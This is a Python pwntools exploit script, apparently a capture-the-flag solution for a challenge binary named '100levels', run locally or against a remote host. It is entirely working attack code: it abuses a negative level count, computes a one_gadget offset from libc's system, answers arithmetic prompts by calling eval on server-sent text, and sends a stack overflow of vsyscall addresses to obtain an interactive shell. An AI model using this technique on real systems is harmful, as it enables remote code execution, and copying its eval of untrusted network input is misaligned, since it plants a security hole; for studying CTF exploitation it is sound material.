from pwn import *

context.log_level ='debug'
vsyscall=0xffffffffff600400
#one_gadget=0xf0567 # this offset conditions fit to this program
#libc=ELF('libc.so')#('/lib/x86_64-linux-gnu/libc-2.23.so')#('libc.so')

def main(argv):
	if len(argv)<2:
		r=process('./100levels')
		libc = ELF('libc.so')
		one_gadget = 0x4526a
	else:
		r=remote('111.198.29.45','30176')
		libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')	
		one_gadget = 0x4526a#0xf0567

	#pause()
	# Hint
	r.recvuntil('Choice:')
	r.sendline('2')

	# Go
	r.recvuntil('Choice:')
	r.sendline('1')

	r.recvuntil('levels?')
	r.sendline('-1')
	r.recvuntil('more?')
	to_one_gadget=one_gadget-libc.symbols['system']
	r.sendline(str(to_one_gadget))

	log.info('Calculating ... ')
	for i in xrange(97):
		r.recvuntil(': ')
		data=r.recvuntil(' =')
		#print data
		d=eval(data[:len(data)-1])
		r.recvuntil('Answer:')
		r.sendline(str(d))
	log.info('Done')
	#pause()
	r.recvuntil('Answer:')
	pl=""
	pl+="0"*56+p64(vsyscall)*23
	r.send(pl)
	
	r.interactive()

main(sys.argv)
